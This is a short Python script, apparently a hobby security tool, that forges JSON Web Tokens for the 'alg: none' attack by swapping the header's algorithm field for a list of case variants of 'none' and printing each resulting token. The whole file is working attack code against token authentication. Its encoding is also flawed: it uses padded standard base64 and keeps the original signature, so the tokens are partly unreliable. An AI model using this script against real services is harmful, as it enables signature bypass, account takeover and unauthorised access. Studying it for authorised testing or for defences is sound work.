import argparse
import base64
import sys
import re 


parser = argparse.ArgumentParser(description= "This program is meant to perform differnt type JWT attak paylod.")
parser.add_argument('-t', '--jwt', help="Enter the jwt token here")
parser.add_argument('-a', '--attack',help="specify attack type e.g none etc.")

args = parser.parse_args()

#print(args.jwt)

# function to check that token has header, payload and signature.
def is_valid_jwt(token):
	parts = token.split('.')

	if len(parts) != 3:
		print("invalid token, please check that token contains all the parts header, payload and signature section")
		sys.exit(0)
	else:
		return parts

#function to check that token is base64 encoded or not
def is_base64_encoded(string):
	try:
		decoded_bytes = base64.b64decode(string)
		decoded_string = decoded_bytes.decode('utf-8')

	except:
		print("invalid token, make sure token is b64 encoded")
		sys.exit(0)


header, payload, signature = is_valid_jwt(args.jwt)

#print(type(header), type(payload), type(signature))

is_base64_encoded(header)

if args.attack == 'none':

	# header is decoded from base64 encoding
	decoded_header_byte = base64.b64decode(header)

	# header decoded from byte to string
	decoded_header = decoded_header_byte.decode('utf-8')

	#regular expression is used to find the alg: part in the header
	pattern = r'"alg"\s*:\s*"[^"]+"'

	# algo replacement is done
	try:
		none_payload = ["NONE", "None", "NOne", "nONE", "noNe", "noNE", "nOnE", "NOne", "NoNE", "nONe", "NonE", "NOne", "NOnE", "NoNe", "NoNE", "NoNE"]
		for i in none_payload:
			replacement = '"alg":'+'"'+str(i)+'"'
			updated_header = re.sub(pattern, replacement,decoded_header)
			#print(decoded_header)
			print(updated_header)

			#base64 encoding is done by converting string to byte first.
			none_alg_header_bytes = base64.b64encode(updated_header.encode('utf-8'))
	
			# byte to string conversion
			none_alg_header = none_alg_header_bytes.decode('utf-8')

			string_list = [none_alg_header, payload, signature]

			# concatantion
			new_token = '.'.join(string_list)
			print(new_token)
	except: 
		print("Regx detection problem.")

	



